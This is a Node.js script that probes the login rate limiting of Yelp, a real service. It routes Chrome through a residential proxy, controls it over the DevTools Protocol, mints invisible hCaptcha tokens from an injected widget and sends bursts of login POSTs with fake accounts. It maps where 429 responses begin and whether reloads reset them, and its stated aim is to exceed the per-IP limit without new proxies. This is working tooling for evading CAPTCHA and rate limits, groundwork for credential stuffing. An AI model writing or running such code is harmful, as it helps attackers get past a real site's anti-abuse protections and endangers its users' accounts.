// testpace/pace-probe.js - exploratory only, never imported by the runner.
//
// Question: can one sticky IP POST faster than ~15/min without buying a new proxy?
// Sends N real POST /login/newajax attempts with fake credentials and records, per POST:
//   i, t (ms since first POST), status, retry-after header, page generation, token length
// so we can see where 429 starts, whether it is a rolling window, and whether reloading
// the page (new csrftok, same IP) resets it.
//
// env: PU_BASE PW [PU] [SESSID] [MAXN=20] [PACE=0] [RELOAD_AFTER=0] [BID=7]
// PACE   = POST/min, 0 means send back to back (burst).
// RELOAD_AFTER = after this many posts, reload the login page and re-arm the widget.
//
// Every credential is fake; a 200 here is still `validated` (wrong password), which is
// exactly what we want: a real POST without a real account.

const http = require('http');
const net = require('net');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');

const BID = parseInt(process.env.BID || '7', 10);
const MAXN = parseInt(process.env.MAXN || '20', 10);
const PACE = parseInt(process.env.PACE || '0', 10);
const RELOAD_AFTER = parseInt(process.env.RELOAD_AFTER || '0', 10);
const PU_BASE = process.env.PU_BASE, PW = process.env.PW;
const SESS = process.env.SESSID || ('pp' + BID + Math.floor(Math.random() * 100000));
const PU = process.env.PU || (PU_BASE + '-sessid-' + SESS + '-sesstime-1800');
const PH = process.env.PROXY_HOST || 'pr.oxylabs.io';
const PP = parseInt(process.env.PROXY_PORT || '7777', 10);
const SITEKEY = process.env.SITEKEY || '6660d4df-1884-4ac6-a933-e5f3bd460946';
const AUTH = 'Basic ' + Buffer.from(PU + ':' + PW).toString('base64');
const LP = 8990 + BID, CP = 9390 + BID;
const OUT = process.env.OUT || path.join(__dirname, 'probe-' + SESS + '.jsonl');

fs.writeFileSync(OUT, '');
const sleep = ms => new Promise(r => setTimeout(r, ms));
const rec = o => { fs.appendFileSync(OUT, JSON.stringify(o) + '\n'); console.log(JSON.stringify(o)); };
process.on('uncaughtException', e => { try { rec({ event: 'abort', why: 'crash', err: String(e && e.message || e) }); } catch (_) {} process.exit(3); });

const relay = http.createServer((q, s) => {
  s.on('error', () => {}); q.on('error', () => {});
  try {
    const u = new URL(q.url);
    const pr = http.request({ host: u.hostname, port: u.port || 80, method: q.method, path: u.pathname + u.search, headers: Object.assign({}, q.headers, { host: u.host }) }, r => { s.writeHead(r.statusCode, r.headers); r.pipe(s); });
    pr.on('error', () => s.destroy()); q.pipe(pr);
  } catch (e) { s.destroy(); }
});
relay.on('clientError', (e, s) => { try { s.destroy(); } catch (_) {} });
relay.on('connect', (req, cs, head) => {
  const sock = net.connect(PP, PH, () => sock.write('CONNECT ' + req.url + ' HTTP/1.1\r\nHost: ' + req.url + '\r\nProxy-Authorization: ' + AUTH + '\r\n\r\n'));
  let buf = Buffer.alloc(0);
  function onData(d) {
    buf = Buffer.concat([buf, d]);
    const i = buf.indexOf('\r\n\r\n'); if (i < 0) return;
    sock.removeListener('data', onData);
    const rest = buf.slice(i + 4);
    const m = buf.slice(0, i).toString().match(/^HTTP\/1\.[01]\s+(\d+)/);
    if (!m || parseInt(m[1], 10) !== 200) { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} sock.destroy(); return; }
    cs.write('HTTP/1.1 200 Connection Established\r\n\r\n');
    if (rest.length) cs.write(rest);
    sock.pipe(cs); cs.pipe(sock);
    if (head && head.length) sock.write(head);
    sock.on('error', () => cs.destroy()); cs.on('error', () => sock.destroy());
  }
  sock.on('data', onData);
  sock.on('error', () => { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} });
});

(async () => {
  const creds = Array.from({ length: MAXN }, (_, k) => ({ email: 'pace.probe' + k + '@gmail.com', pass: 'WrongPass!7788' }));
  rec({ event: 'start', sess: SESS, n: MAXN, pace: PACE, reloadAfter: RELOAD_AFTER });

  await new Promise(r => relay.listen(LP, '127.0.0.1', r));
  const udd = path.join(os.tmpdir(), 'pp-' + Date.now());
  const cdd = path.join(os.tmpdir(), 'yelp-cache', 'probe');
  try { fs.mkdirSync(cdd, { recursive: true }); } catch (e) {}
  const chrome = spawn(process.env.CHROME || 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', [
    '--no-first-run', '--no-default-browser-check', '--window-size=900,700', '--lang=en-US',
    '--user-data-dir=' + udd,
    '--disable-background-timer-throttling', '--disable-renderer-backgrounding',
    '--blink-settings=imagesEnabled=false', '--disable-remote-fonts',
    '--disk-cache-dir=' + cdd, '--disk-cache-size=67108864',
    '--disable-features=CalculateNativeWinOcclusion,IntensiveWakeUpThrottling,Prerender2',
    '--proxy-server=http://127.0.0.1:' + LP, '--remote-debugging-port=' + CP,
    'about:blank'
  ], { stdio: 'ignore' });

  let ver = null;
  for (let k = 0; k < 60 && !ver; k++) { await sleep(250); try { ver = await (await fetch('http://127.0.0.1:' + CP + '/json/version')).json(); } catch (e) {} }
  if (!ver) { rec({ event: 'abort', why: 'cdp' }); chrome.kill(); relay.close(); return; }
  const ws = new WebSocket(ver.webSocketDebuggerUrl);
  ws.addEventListener('error', () => {});
  let id = 0; const pend = new Map();
  ws.addEventListener('message', ev => {
    let m; try { m = JSON.parse(ev.data); } catch (e) { return; }
    if (m.method === 'Fetch.requestPaused') {
      ws.send(JSON.stringify({ id: ++id, method: 'Fetch.failRequest', params: { requestId: m.params.requestId, errorReason: 'BlockedByClient' }, sessionId: m.sessionId }));
      return;
    }
    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }
  });
  await new Promise((res, rej) => { ws.addEventListener('open', res); ws.addEventListener('error', rej); });
  const send = (mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {} })); });

  let sid = null;
  for (let k = 0; k < 60 && !sid; k++) {
    await sleep(250);
    const t = await send('Target.getTargets');
    if (t && t.result) {
      const pg = t.result.targetInfos.find(x => x.type === 'page');
      if (pg) { const a = await send('Target.attachToTarget', { targetId: pg.targetId, flatten: true }); if (a && a.result) sid = a.result.sessionId; }
    }
  }
  if (!sid) { rec({ event: 'abort', why: 'cdp' }); chrome.kill(); relay.close(); return; }
  const sendS = (mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {}, sessionId: sid })); });
  const ev = e => new Promise(resolve => {
    const mid = Math.floor(Math.random() * 1e9);
    const h = x => { try { const m = JSON.parse(x.data); if (m.id === mid) { ws.removeEventListener('message', h); resolve(m.result && m.result.result ? m.result.result.value : null); } } catch (err) {} };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id: mid, method: 'Runtime.evaluate', params: { expression: e, returnByValue: true, awaitPromise: true }, sessionId: sid }));
    setTimeout(() => resolve(null), 20000);
  });

  await sendS('Page.enable'); await sendS('Network.enable', {});
  await sendS('Emulation.setFocusEmulationEnabled', { enabled: true });
  await sendS('Page.bringToFront', {});
  await sendS('Fetch.enable', { patterns: [
    { urlPattern: '*', resourceType: 'Image', requestStage: 'Request' },
    { urlPattern: '*', resourceType: 'Media', requestStage: 'Request' },
    { urlPattern: '*', resourceType: 'Font', requestStage: 'Request' }] });
  try { await sendS('Network.setBlockedURLs', { urls: require('../runner/bw-blocklist') }); } catch (e) {}

  async function hydrate() {
    for (let a = 0; a < 3; a++) {
      await sendS('Page.navigate', { url: 'https://www.yelp.com/login/' });
      for (let k = 0; k < 25; k++) {
        await sleep(800);
        const s = await ev(`JSON.stringify({f:!!document.getElementById('ajax-login'),h:!!window.hcaptcha,l:document.documentElement.outerHTML.length})`);
        try { const o = JSON.parse(s); if (o && o.f && o.h) return true; } catch (e) {}
      }
    }
    return false;
  }
  async function arm() {
    return await ev(`(function(){
      if(!window.hcaptcha) return 'no-api';
      var c=document.querySelector('[data-hcaptcha-widget-id]');
      if(c && c.getAttribute('data-hcaptcha-widget-id')){ window.__wid=c.getAttribute('data-hcaptcha-widget-id'); return 'site:'+window.__wid; }
      var d=document.createElement('div'); d.id='__pcap'; d.style.display='none'; document.body.appendChild(d);
      window.__wid=window.hcaptcha.render(d,{sitekey:'${SITEKEY}',size:'invisible',callback:function(t){window.__pacTok=t;}});
      return 'own:'+window.__wid;
    })()`);
  }
  const mint = () => ev(`new Promise(function(res){
    var w=window.__wid;
    if(!w){ res(''); return; }
    var done=false; function fin(t){ if(!done){ done=true; res(t||''); } }
    window.__pacTok='';
    try { window.hcaptcha.execute(w); } catch(e){ fin(''); return; }
    var n=0;
    var iv=setInterval(function(){
      n++;
      var t=window.__pacTok||'';
      if(!t){ try { t=window.hcaptcha.getResponse(w)||''; } catch(e){} }
      if(t){ clearInterval(iv); fin(t); }
      else if(n>60){ clearInterval(iv); fin(''); }
    },200);
  })`);
  const post = (csrf, c, tok) => ev(`(async function(){
    var b=new URLSearchParams();
    b.set('csrftok', ${JSON.stringify(csrf)});
    b.set('email', ${JSON.stringify(c.email)});
    b.set('password', ${JSON.stringify(c.pass)});
    b.set('hcaptcha_response', ${JSON.stringify(tok)});
    try {
      var r=await fetch('/login/newajax',{method:'POST',credentials:'include',
        headers:{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'},
        body:b.toString()});
      return JSON.stringify({status:r.status, ra:r.headers.get('retry-after')||'', body:(await r.text()).slice(0,120)});
    } catch(e){ return JSON.stringify({status:-1, ra:'', body:'fetch:'+e.message}); }
  })()`);

  if (!await hydrate()) { rec({ event: 'abort', why: 'hydrate' }); chrome.kill(); relay.close(); return; }
  rec({ event: 'widget', armed: await arm() });
  let csrf = await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
  rec({ event: 'csrf', len: (csrf || '').length });

  const t0 = Date.now();
  let gen = 0, posted = 0, c429 = 0, c200 = 0, tokFail = 0;
  for (let i = 0; i < MAXN; i++) {
    if (PACE > 0) {
      const due = t0 + (posted * 60000 / PACE);
      const wait = due - Date.now(); if (wait > 0) await sleep(wait);
    }
    const tok = await mint();
    if (!tok) { tokFail++; rec({ event: 'tokfail', i: i + 1, gen }); continue; }
    const raw = await post(csrf, creds[i], tok);
    posted++;
    let r = {}; try { r = JSON.parse(raw || '{}'); } catch (e) {}
    if (r.status === 429) c429++; else if (r.status === 200) c200++;
    rec({ i: i + 1, t: Date.now() - t0, gen, status: r.status, ra: r.ra, tokLen: String(tok).length, body: (r.body || '').slice(0, 80) });

    if (RELOAD_AFTER > 0 && posted === RELOAD_AFTER && i + 1 < MAXN) {
      gen++;
      rec({ event: 'reload', after: posted, gen });
      if (!await hydrate()) { rec({ event: 'abort', why: 'rehydrate' }); break; }
      await arm();
      csrf = await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
    }
    if (r.status === 403) { rec({ event: 'stop', why: '403', posted }); break; }
  }
  rec({ event: 'summary', posted, c200, c429, tokFail, secs: Math.round((Date.now() - t0) / 1000), sess: SESS });

  try { ws.close(); } catch (e) {}
  try { chrome.kill(); } catch (e) {}
  try { fs.rmSync(udd, { recursive: true, force: true }); } catch (e) {}
  try { relay.close(); } catch (e) {}
  setTimeout(() => process.exit(0), 500);
})();
